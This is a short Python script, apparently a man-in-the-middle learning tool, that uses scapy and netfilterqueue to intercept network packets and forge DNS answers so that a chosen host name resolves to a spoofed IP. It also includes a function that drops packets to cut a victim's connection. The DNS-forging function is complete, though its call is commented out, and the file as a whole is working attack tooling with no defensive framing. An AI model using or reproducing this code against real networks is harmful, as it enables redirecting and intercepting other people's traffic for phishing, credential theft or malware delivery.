#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue
import optparse

name = ""
ip = ""


def getInput():
    parser = optparse.OptionParser()
    parser.add_option("-n", "--name", dest="name", help="Specify host Name")
    parser.add_option("-i", "--ip", dest="ip", help="Specify spoofed Ip")
    options = parser.parse_args()[0]
    return options


def cut_internet_connection(packet):
    packet.drop()


def dns_spoof(scapy_packet):
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if name in qname:
            print("[+] DNS packet identified.")
            answer = scapy.DNSRR(rrname=qname, rdata=ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum

            return scapy_packet


def process_sniffed_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # scapy_packet = dns_spoof(scapy_packet)
    # if scapy_packet:
    #     packet.set_payload(str(scapy_packet))
    if scapy_packet.haslayer(scapy.UDP):
        print(scapy_packet.show())
        print(scapy_packet.summary())
    packet.accept()


options = getInput()
if not options.name:
    print("Specify host Name")
elif not options.ip:
    print("Specify spoofed Ip")
else:
    name = options.name
    ip = options.ip
    nfqueue = netfilterqueue.NetfilterQueue()
    nfqueue.bind(0, process_sniffed_packet)
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print("[+] Quitting")
        nfqueue.unbind()
